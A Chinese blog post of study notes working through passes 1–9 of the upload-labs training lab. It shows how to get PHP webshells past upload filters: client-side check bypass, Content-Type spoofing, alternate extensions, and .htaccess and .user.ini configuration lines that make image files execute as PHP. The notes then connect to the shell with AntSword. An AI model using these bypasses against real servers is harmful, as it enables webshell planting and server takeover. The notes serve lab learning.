<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>upload | MIXBP</title>
  <meta name="keywords" content=" 学习笔记 , 文件上传 ">
  <meta name="description" content="upload | MIXBP">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="description" content="Linux目录结构Linux的目录结构是一个树型结构 windows系统可以拥有多个盘符，如C盘，D盘，E盘 Linux没有盘符这个概念，只有一个根目录&#x2F;，所有文件都在它下面  Linux路径的描述方式在Linux中，路径之间的层级关系，使用：&#x2F;来表示 在windows系统中，路径之间的层级关系，使用：\来表示  FinalShell连接前先输入 1sudo service s">
<meta property="og:type" content="article">
<meta property="og:title" content="linux基础命令">
<meta property="og:url" content="https://mixbp.github.io/master/2025/02/01/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/index.html">
<meta property="og:site_name" content="MIXBP">
<meta property="og:description" content="Linux目录结构Linux的目录结构是一个树型结构 windows系统可以拥有多个盘符，如C盘，D盘，E盘 Linux没有盘符这个概念，只有一个根目录&#x2F;，所有文件都在它下面  Linux路径的描述方式在Linux中，路径之间的层级关系，使用：&#x2F;来表示 在windows系统中，路径之间的层级关系，使用：\来表示  FinalShell连接前先输入 1sudo service s">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://mixbp.github.io/image/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-1.png">
<meta property="og:image" content="https://mixbp.github.io/image/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-2.png">
<meta property="og:image" content="https://mixbp.github.io/image/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-3.png">
<meta property="og:image" content="https://mixbp.github.io/image/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-4.png">
<meta property="article:published_time" content="2025-02-01T14:14:44.000Z">
<meta property="article:modified_time" content="2025-02-02T17:45:40.888Z">
<meta property="article:author" content="MIXBP">
<meta property="article:tag" content="学习笔记">
<meta property="article:tag" content="linux">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://mixbp.github.io/image/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-1.png">


<link rel="icon" href="/img/avatar.jpg">

<link href="/css/style.css?v=1.1.0" rel="stylesheet">

<link href="/css/hl_theme/atom-light.css?v=1.1.0" rel="stylesheet">

<link href="//cdn.jsdelivr.net/npm/animate.css@4.1.0/animate.min.css" rel="stylesheet">

<script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
<script src="/js/titleTip.js?v=1.1.0" ></script>

<script src="//cdn.jsdelivr.net/npm/highlightjs@9.16.2/highlight.pack.min.js"></script>
<script>
    hljs.initHighlightingOnLoad();
</script>

<script src="//cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>



<script src="/js/iconfont.js?v=1.1.0" ></script>

<meta name="generator" content="Hexo 7.3.0"></head>
<div style="display: none">
  <input class="theme_disqus_on" value="false">
  <input class="theme_preload_comment" value="">
  <input class="theme_blog_path" value="">
  <input id="theme_shortcut" value="true" />
  <input id="theme_highlight_on" value="true" />
  <input id="theme_code_copy" value="true" />
</div>



<body>
<aside class="nav">
    <div class="nav-left">
        <a href="/"
   class="avatar_target">
    <img class="avatar"
         src="/img/avatar.jpg"/>
</a>
<div class="author">
    <span>MIXBP</span>
</div>

<div class="icon">
    
        
            <a title="github"
               href="https://mixbp.github.io/"
               target="_blank">
                
                    <svg class="iconfont-svg" aria-hidden="true">
                        <use xlink:href="#icon-github"></use>
                    </svg>
                
            </a>
        
    
        
            <a title="email"
               href="mailto:2439254357@qq.com"
               target="_blank">
                
                    <svg class="iconfont-svg" aria-hidden="true">
                        <use xlink:href="#icon-email"></use>
                    </svg>
                
            </a>
        
    
        
            <a title="qq"
               href="http://wpa.qq.com/msgrd?v=3&uin=2439254357&site=qq&menu=yes"
               target="_blank">
                
                    <svg class="iconfont-svg" aria-hidden="true">
                        <use xlink:href="#icon-qq"></use>
                    </svg>
                
            </a>
        
    
</div>



    <a class="more-menus">更多菜单</a>



<ul>
    <li>
        <div class="all active" data-rel="All">All
            
                <small>(20)</small>
            
        </div>
    </li>
    
</ul>
<div class="left-bottom">
    <div class="menus">
        
            
            
                <a class="dynamic-menu "
                   target="_self"
                   
                   href="https://mixbp.github.io/">MIXBP</a>
        
            
                <a class="dynamic-menu "
                   target="_blank"
                        
                   href="https://mixbp.github.io/">github</a>
        
    </div>
    <div>
        
            <a class="about  hasFriend  site_url"
               
               href="/about">About</a>
        
        <a style="width: 50%"
                
                                           class="friends">Friends</a>
        
    </div>
</div>
<input type="hidden" id="yelog_site_posts_number" value="20">
<input type="hidden" id="yelog_site_word_count" value="34.5k">
<div style="display: none">
    <span id="busuanzi_value_site_uv"></span>
    <span id="busuanzi_value_site_pv"></span>
</div>

    </div>
    <div class="nav-right">
        <div class="friends-area">
    <div class="friends-title">
        Links
        <i class="iconfont icon-left"></i>
    </div>
    <div class="friends-content">
        <ul>
            
            <li><a target="_blank" href="https://mixbp.github.io/">MIXBP</a></li>
            
        </ul>
    </div>
</div>
        <div class="title-list">
    <div class="right-top">
        <div id="default-panel">
            <i class="iconfont icon-search" data-title="search shortcut key i"></i>
            <div class="right-title">All</div>
            <i class="iconfont icon-file-tree" data-title="switch to outline view shortcut key w"></i>
        </div>
        <div id="search-panel">
            <i class="iconfont icon-left" data-title="return"></i>
            <input id="local-search-input" autocomplete="off"/>
            <label class="border-line" for="input"></label>
            <i class="iconfont icon-case-sensitive" data-title="case sensitive"></i>
            <i class="iconfont icon-tag" data-title="label"></i>
        </div>
        <div id="outline-panel" style="display: none">
            <div class="right-title">outline</div>
            <i class="iconfont icon-list" data-title="switch to article list"></i>
        </div>
    </div>

    <div class="tags-list">
    <input id="tag-search" />
    <div class="tag-wrapper">
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>命令执行</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>日志包含</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>文件包含</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>文件上传</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>学习笔记</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>正则表达式</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>做题笔记</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>filter伪协议</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>HTML</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>http协议</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>linux</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>MySQL</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>payload构造</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>php</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>PHP特性</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>python</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>sql注入</a>
            </li>
        
    </div>

</div>

    
    <div id="local-search-result">

    </div>
    
    <nav id="title-list-nav">
        
        
        <a  class="All "
           href="/2025/02/01/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/"
           data-tag="学习笔记,linux"
           data-author="" >
            <span class="post-title" title="linux基础命令">linux基础命令</span>
            <span class="post-date" title="2025-02-01 22:14:44">2025/02/01</span>
        </a>
        
        
        <a  class="All "
           href="/2025/01/29/PHP%E7%89%B9%E6%80%A7/"
           data-tag="学习笔记,PHP特性"
           data-author="" >
            <span class="post-title" title="PHP特性">PHP特性</span>
            <span class="post-date" title="2025-01-29 23:55:03">2025/01/29</span>
        </a>
        
        
        <a  class="All "
           href="/2025/01/29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"
           data-tag="学习笔记,命令执行"
           data-author="" >
            <span class="post-title" title="命令执行">命令执行</span>
            <span class="post-date" title="2025-01-29 22:54:38">2025/01/29</span>
        </a>
        
        
        <a  class="All "
           href="/2025/01/29/ctfshow-web82/"
           data-tag="做题笔记,文件包含"
           data-author="" >
            <span class="post-title" title="ctfshow-web82">ctfshow-web82</span>
            <span class="post-date" title="2025-01-29 04:36:22">2025/01/29</span>
        </a>
        
        
        <a  class="All "
           href="/2025/01/29/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"
           data-tag="学习笔记,文件包含"
           data-author="" >
            <span class="post-title" title="文件包含漏洞总结">文件包含漏洞总结</span>
            <span class="post-date" title="2025-01-29 02:22:55">2025/01/29</span>
        </a>
        
        
        <a  class="All "
           href="/2025/01/26/ctfshow-web160/"
           data-tag="做题笔记,文件上传,日志包含"
           data-author="" >
            <span class="post-title" title="[ctfshow]web160">[ctfshow]web160</span>
            <span class="post-date" title="2025-01-26 16:37:35">2025/01/26</span>
        </a>
        
        
        <a  class="All "
           href="/2025/01/26/buuctf%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98upload/"
           data-tag="做题笔记,文件上传"
           data-author="" >
            <span class="post-title" title="buuctf极客大挑战upload">buuctf极客大挑战upload</span>
            <span class="post-date" title="2025-01-26 16:36:39">2025/01/26</span>
        </a>
        
        
        <a  class="All "
           href="/2025/01/22/upload/"
           data-tag="学习笔记,文件上传"
           data-author="" >
            <span class="post-title" title="upload">upload</span>
            <span class="post-date" title="2025-01-22 15:22:47">2025/01/22</span>
        </a>
        
        
        <a  class="All "
           href="/2025/01/19/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"
           data-tag="学习笔记,python"
           data-author="" >
            <span class="post-title" title="python学习笔记">python学习笔记</span>
            <span class="post-date" title="2025-01-19 01:39:35">2025/01/19</span>
        </a>
        
        
        <a  class="All "
           href="/2025/01/09/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Http/"
           data-tag="做题笔记,http协议"
           data-author="" >
            <span class="post-title" title="极客大挑战2019Http">极客大挑战2019Http</span>
            <span class="post-date" title="2025-01-09 16:47:44">2025/01/09</span>
        </a>
        
        
        <a  class="All "
           href="/2025/01/09/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019SecretFile/"
           data-tag="做题笔记,filter伪协议"
           data-author="" >
            <span class="post-title" title="极客大挑战2019SecretFile">极客大挑战2019SecretFile</span>
            <span class="post-date" title="2025-01-09 01:36:08">2025/01/09</span>
        </a>
        
        
        <a  class="All "
           href="/2025/01/05/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019LoveSQL/"
           data-tag="做题笔记,sql注入"
           data-author="" >
            <span class="post-title" title="极客大挑战2019LoveSQL">极客大挑战2019LoveSQL</span>
            <span class="post-date" title="2025-01-05 20:00:42">2025/01/05</span>
        </a>
        
        
        <a  class="All "
           href="/2025/01/05/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Havefun/"
           data-tag="做题笔记,payload构造"
           data-author="" >
            <span class="post-title" title="极客大挑战2019Havefun">极客大挑战2019Havefun</span>
            <span class="post-date" title="2025-01-05 19:35:48">2025/01/05</span>
        </a>
        
        
        <a  class="All "
           href="/2025/01/05/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019EasySQL/"
           data-tag="做题笔记,sql注入"
           data-author="" >
            <span class="post-title" title="极客大挑战2019EasySQL">极客大挑战2019EasySQL</span>
            <span class="post-date" title="2025-01-05 19:10:32">2025/01/05</span>
        </a>
        
        
        <a  class="All "
           href="/2025/01/03/sql%E6%B3%A8%E5%85%A5/"
           data-tag="学习笔记,sql注入"
           data-author="" >
            <span class="post-title" title="sql注入">sql注入</span>
            <span class="post-date" title="2025-01-03 21:14:16">2025/01/03</span>
        </a>
        
        
        <a  class="All "
           href="/2024/12/29/MySQL/"
           data-tag="学习笔记,MySQL"
           data-author="" >
            <span class="post-title" title="MySQL">MySQL</span>
            <span class="post-date" title="2024-12-29 19:30:51">2024/12/29</span>
        </a>
        
        
        <a  class="All "
           href="/2024/12/28/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%AC%94%E8%AE%B0/"
           data-tag="学习笔记,正则表达式"
           data-author="" >
            <span class="post-title" title="正则表达式笔记">正则表达式笔记</span>
            <span class="post-date" title="2024-12-28 20:46:55">2024/12/28</span>
        </a>
        
        
        <a  class="All "
           href="/2024/12/26/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"
           data-tag="学习笔记,php"
           data-author="" >
            <span class="post-title" title="PHP学习笔记">PHP学习笔记</span>
            <span class="post-date" title="2024-12-26 23:50:15">2024/12/26</span>
        </a>
        
        
        <a  class="All "
           href="/2024/12/25/HTML%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"
           data-tag="学习笔记,HTML"
           data-author="" >
            <span class="post-title" title="HTML学习笔记">HTML学习笔记</span>
            <span class="post-date" title="2024-12-25 23:54:00">2024/12/25</span>
        </a>
        
        
        <a  class="All "
           href="/2024/12/25/welcome/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="welcome">welcome</span>
            <span class="post-date" title="2024-12-25 20:38:33">2024/12/25</span>
        </a>
        
        <div id="no-item-tips">

        </div>
    </nav>
    <div id="outline-list">
    </div>
</div>

    </div>
    <div class="hide-list">
        <div class="semicircle" data-title="Toggle full screen shortcut key s">
            <div class="brackets first"><</div>
            <div class="brackets">&gt;</div>
        </div>
    </div>
</aside>
<div id="post">
    <div class="pjax">
        <article id="post-upload" class="article article-type-post" itemscope itemprop="blogPost">
    
        <h1 class="article-title">upload</h1>
    
    <div class="article-meta">
        
        
        
        
        <span class="tag">
            <i class="iconfont icon-tag"></i>
            
            <a class="color5">学习笔记</a>
            
            <a class="color5">文件上传</a>
            
        </span>
        
    </div>
    <div class="article-meta">
        
            Created At : <time class="date" title='Updated At: 2025-01-31 05:01:56'>2025-01-22 15:22</time>
        
    </div>
    <div class="article-meta">
        
        <span>Count:4.2k</span>
        
        
        <span id="busuanzi_container_page_pv">
            Views 👀 :<span id="busuanzi_value_page_pv">
                <span class="count-comment">
                    <span class="spinner">
                      <div class="cube1"></div>
                      <div class="cube2"></div>
                    </span>
                </span>
            </span>
        </span>
        
        
        <span class="top-comment" title="Jump to comment area">
            <a href="#comments">
                Comment:<span class="count-comment">
                    <span class="spinner">
                      <div class="cube1"></div>
                      <div class="cube2"></div>
                    </span>
                </span>
            </a>
        </span>
        
    </div>
    
    <div class="toc-ref">
    
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#pass-01-js%E7%BB%95%E8%BF%87"><span class="toc-text">pass-01-js绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pass-02-content-type%E7%BB%95%E8%BF%87"><span class="toc-text">pass-02-content-type绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pass-03-%E7%89%B9%E6%AE%8A%E5%90%8E%E7%BC%80%E7%BB%95%E8%BF%87"><span class="toc-text">pass-03-特殊后缀绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pass-04-htaccess%E7%BB%95%E8%BF%87"><span class="toc-text">pass-04-.htaccess绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pass-05-user-ini%E7%BB%95%E8%BF%87"><span class="toc-text">pass-05-.user.ini绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%82%B9%E5%8A%A0%E7%A9%BA%E6%A0%BC%E5%8A%A0%E7%82%B9%E7%BB%95%E8%BF%87"><span class="toc-text">点加空格加点绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pass-06-%E5%A4%A7%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-text">pass-06-大写绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pass-07-%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87"><span class="toc-text">pass-07-空格绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pass-08-%E5%90%8E%E7%BC%80%E5%8A%A0%E7%82%B9%E7%BB%95%E8%BF%87"><span class="toc-text">pass-08-后缀加点绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pass-09-DATA%E7%BB%95%E8%BF%87"><span class="toc-text">pass-09-$DATA绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pass-10-%E7%82%B9%E7%A9%BA%E6%A0%BC%E7%82%B9%E7%BB%95%E8%BF%87"><span class="toc-text">pass-10-点空格点绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pass-11-%E5%8F%8C%E5%86%99%E5%90%8E%E7%BC%80%E7%BB%95%E8%BF%87"><span class="toc-text">pass-11-双写后缀绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pass-12-00%E6%88%AA%E6%96%AD"><span class="toc-text">pass-12-%00截断</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#psss-13-0x00%E6%88%AA%E6%96%AD"><span class="toc-text">psss-13-0x00截断</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pass-14-%E5%AD%97%E8%8A%82%E6%A0%87%E8%AF%86%E7%BB%95%E8%BF%87"><span class="toc-text">pass-14-字节标识绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pass-15-%E5%9B%BE%E7%89%87%E9%A9%AC%E7%BB%95%E8%BF%87"><span class="toc-text">pass-15-图片马绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pass-16-%E5%9B%BE%E7%89%87%E9%A9%AC%E7%BB%95%E8%BF%87"><span class="toc-text">pass-16-图片马绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pass-17-%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87"><span class="toc-text">pass-17-二次渲染绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pass-18-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E5%8E%9F%E7%90%86%E4%B8%8E%E7%BB%95%E8%BF%87"><span class="toc-text">pass-18-条件竞争原理与绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pass-19-apache%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="toc-text">pass-19-apache解析漏洞+条件竞争</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pass-20-%E5%90%8E%E7%BC%80%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93"><span class="toc-text">pass-20-后缀绕过总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pass-21-%E5%AE%A1%E8%AE%A1-%E6%95%B0%E7%BB%84%E5%90%8E%E7%BC%80%E7%BB%95%E8%BF%87"><span class="toc-text">pass-21-审计+数组后缀绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%B9%BB%E6%9C%AF%E5%A4%B4"><span class="toc-text">文件幻术头</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%B9%BB%E6%9C%AF%E5%A4%B4%E7%9A%84%E4%B8%BB%E8%A6%81%E4%BD%9C%E7%94%A8"><span class="toc-text">文件幻术头的主要作用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E6%96%87%E4%BB%B6%E5%B9%BB%E6%9C%AF%E5%A4%B4"><span class="toc-text">常见的图片文件格式文件幻术头</span></a></li></ol></li></ol>
    
<style>
    .left-col .switch-btn,
    .left-col .switch-area {
        display: none;
    }
    .toc-level-3 i,
    .toc-level-3 ol {
        display: none !important;
    }
</style>
</div>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p><img src="/../image/upload-0.png"></p>
<h2 id="pass-01-js绕过"><a href="#pass-01-js绕过" class="headerlink" title="pass-01-js绕过"></a>pass-01-js绕过</h2><p><img src="/../image/upload-pass01-1.png"></p>
<p><img src="/../image/upload-pass01-2.png"></p>
<p>发现如果文件是php格式，会被拦截，且抓包抓不到东西，所以判断是前端js拦截</p>
<p>将文件格式改为jpg然后上传，并抓包</p>
<p><img src="/../image/upload-pass01-3.png"><img src="/../image/upload-pass01-4.png"></p>
<p>这样就绕过前端验证了</p>
<p>拦截后将格式修改回php并放包</p>
<p><img src="/../image/upload-pass01-5.png"></p>
<p>发现已经上传成功了，使用蚁剑连接试试</p>
<p><img src="/../image/upload-pass01-6.png"></p>
<p>右键复制图片链接并在蚁剑中测试连接出现连接成功</p>
<p><img src="/../image/upload-pass01-7.png"></p>
<p>第二种方法：</p>
<p>直接在浏览器中禁用所有js代码</p>
<p>先打开开发者工具，然后点击右上角设置按钮</p>
<p><img src="/../image/upload-pass01-8.png"></p>
<p>停用javascript然后直接上传php文件即可</p>
<p><img src="/../image/upload-pass01-9.png"></p>
<p>第三种方法：</p>
<p>检查前端js代码</p>
<p>查看代码发现上传表单绑定了一个js</p>
<p><img src="/../image/upload-pass01-10.png"></p>
<p>js代码</p>
<p><img src="/../image/upload-pass01-11.png"></p>
<p>直接修改return true即可</p>
<p><img src="/../image/upload-pass01-12.png"></p>
<h2 id="pass-02-content-type绕过"><a href="#pass-02-content-type绕过" class="headerlink" title="pass-02-content-type绕过"></a>pass-02-content-type绕过</h2><p><img src="/../image/upload-pass02-1.png"></p>
<p>同样上传php文件，显示文件类型不正确，请重新上传，并且可以抓到包，所以判断验证是在后端进行的</p>
<p><img src="/../image/upload-pass02-2.png"></p>
<p>用bp抓包并把文件类型改为image&#x2F;jpeg</p>
<p><img src="/../image/upload-pass02-3.png"></p>
<p>上传成功</p>
<p><img src="/../image/upload-pass02-4.png"></p>
<h2 id="pass-03-特殊后缀绕过"><a href="#pass-03-特殊后缀绕过" class="headerlink" title="pass-03-特殊后缀绕过"></a>pass-03-特殊后缀绕过</h2><p>直接上传php文件，发现能够抓到包，所以判断验证是在后端进行的</p>
<p><img src="/../image/upload-pass03-1.png"></p>
<p>在传入php文件时，发现它提示不允许上传这些后缀文件传.asp,.aspx,.php,.jsp后缀文件,检查源码也发现这些</p>
<p>php环境可以尝试的后缀还有php1,php2,php3,php4,php5,phtmI,pht</p>
<p>直接抓包然后直接把php后缀名改为php3</p>
<p><img src="/../image/upload-pass03-2.png"></p>
<p>上传成功</p>
<p><img src="/../image/upload-pass03-3.png"></p>
<p>但是这里用蚁剑无法连接，说是Apache服务器不对php3以php格式解析，要修改配置文件。</p>
<h2 id="pass-04-htaccess绕过"><a href="#pass-04-htaccess绕过" class="headerlink" title="pass-04-.htaccess绕过"></a>pass-04-.htaccess绕过</h2><p><img src="/../image/upload-pass04-1.png"></p>
<p>先修改配置文件</p>
<p>通过源码和提示发现这关基本禁止了一切可以被解析的php文件</p>
<p><img src="/../image/upload-pass04-2.png"></p>
<p>但是.htaccess后缀没有被禁止，所以先写一下要上传的.htaccess配置文件</p>
<p>新建一个配置文件然后输入</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">AddType application/x-httpd-php .jpg .txt<br><br><br>这个也行<br>&lt;FilesMatch <span class="hljs-string">&#x27;mixbp.jpg&#x27;</span>&gt;<br>SetHandler application/x-httpd-php<br>&lt;/FilesMatch&gt;<br></code></pre></td></tr></table></figure>

<p>意思是能够将.jpg和.txt格式文件按php格式解析</p>
<p><img src="/../image/upload-pass04-3.png"></p>
<p>然后先上传.htaccess文件再上传jpg格式的php文件（内含一句话木马）</p>
<p>然后就能用蚁剑连接了</p>
<h2 id="pass-05-user-ini绕过"><a href="#pass-05-user-ini绕过" class="headerlink" title="pass-05-.user.ini绕过"></a>pass-05-.user.ini绕过</h2><p>前置知识</p>
<p><img src="/../image/upload-pass05-1.png"></p>
<p><img src="/../image/upload-pass05-2.png"></p>
<p><strong>.user.ini文件上传漏洞的前提：</strong></p>
<p>.user.ini可以生效并且该上传目录有php文件（比如这关后台的readme.php文件）</p>
<p><code>auto_prepend_file</code> 是 PHP 的一个配置选项，可以用来指定一个文件，在每个 <strong>PHP 脚本执行之前自动包含该文件的内容。这个文件会在 PHP 脚本的头部被包含执行，即在执行脚本之前会先执行这个文件。</strong></p>
<p>写法：</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">auto_prepend_file</span>=mixbp.jpg<br></code></pre></td></tr></table></figure>

<p>构造mixbp.jpg文件，内含一句话木马，并且输出包含成功方便判断是否包含成功<br><img src="/../image/upload-pass05-3.png"></p>
<p>auto_prepend file为自动包含文件</p>
<p>.user.ini文件里写auto_prepend file&#x3D;mixbp.jpg （里面有一句话木马）</p>
<p><img src="/../image/upload-pass05-5.png"></p>
<p>然后就是先上传.ini文件，再上传jpg文件</p>
<p>然后通过访问服务器中的readme.php文件来实现auto_prepend_file功能<br>默认是要等待5分钟才能生效这里修改下配置文件，改成10秒</p>
<p><img src="/../image/upload-pass05-4.png"></p>
<p>上传完文件后访问readme.php</p>
<p><img src="/../image/upload-pass05-6.png"></p>
<p>包含成功，然后就能用蚁剑连接以下url</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">32.1</span><span class="hljs-regexp">/upload/u</span>pload/readme.php<br></code></pre></td></tr></table></figure>

<h3 id="点加空格加点绕过"><a href="#点加空格加点绕过" class="headerlink" title="点加空格加点绕过"></a><strong>点加空格加点绕过</strong></h3><p>原理：查看源码发现源码会检验一遍文件名然后先去除末尾的.然后去除一个空格，之后就不会再进行检验了，.php. .去除一个.空格后就变成了.php. ，然后windows系统文件格式末尾的. 会在解析时自动去除，然后就能上传成功了</p>
<p>就是先上传php文件，然后抓包修改php格式为.php. .</p>
<p><img src="/../image/upload-pass05-7.png"></p>
<p><img src="/../image/upload-pass05-8.png"></p>
<p><img src="/../image/upload-pass05-9.png"></p>
<p>注意：这里由于末尾的.会自动去除，用蚁剑连接输入url的时候直接省去就行，但是好像不省去也行</p>
<h2 id="pass-06-大写绕过"><a href="#pass-06-大写绕过" class="headerlink" title="pass-06-大写绕过"></a>pass-06-大写绕过</h2><p>原理：在系统中文件后缀格式会自动解析成小写，所以可以用大写绕过，且这关的源码查看后发现没有将后缀改为小写</p>
<p>步骤：</p>
<ol>
<li>上传mixbp.php</li>
<li>抓包改写后缀为.Php（随便大写都行）</li>
<li>上传成功复制图片链接然后蚁剑连接</li>
</ol>
<p>这里会出现服务器错误，改成php+nginx就能成功连接了</p>
<h2 id="pass-07-空格绕过"><a href="#pass-07-空格绕过" class="headerlink" title="pass-07-空格绕过"></a>pass-07-空格绕过</h2><p>原理：在文件格式后加空格，windows系统在解析文件时会自动删掉空格，这关源码没有首尾去空格</p>
<p>步骤：</p>
<ol>
<li>上传mixbp.php</li>
<li>抓包改写后缀为.php    后面加几个空格</li>
<li>上传复制图片链接然后蚁剑连接</li>
</ol>
<h2 id="pass-08-后缀加点绕过"><a href="#pass-08-后缀加点绕过" class="headerlink" title="pass-08-后缀加点绕过"></a>pass-08-后缀加点绕过</h2><p>在后缀后面加点就完事了，其他和上面一样，原理也是后缀的点会自动去除</p>
<p>原理：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">strrchr</span><span class="hljs-params">()</span></span> 函数（在php中）查找字符在指定字符串中从右面开始的第一次出现的位置，如果成功，返回该字符以及其后面的字符<br><br>比如mixbp<span class="hljs-selector-class">.php</span>.<br>因为没有去除末尾的点,源码会取到后缀就是最后那个点<br>而单个的.不在黑名单中<br></code></pre></td></tr></table></figure>

<h2 id="pass-09-DATA绕过"><a href="#pass-09-DATA绕过" class="headerlink" title="pass-09-$DATA绕过"></a>pass-09-$DATA绕过</h2><p>前置知识：额外数据流<br><img src="/../image/upload-pass09-1.png"></p>
<p>写入方法：</p>
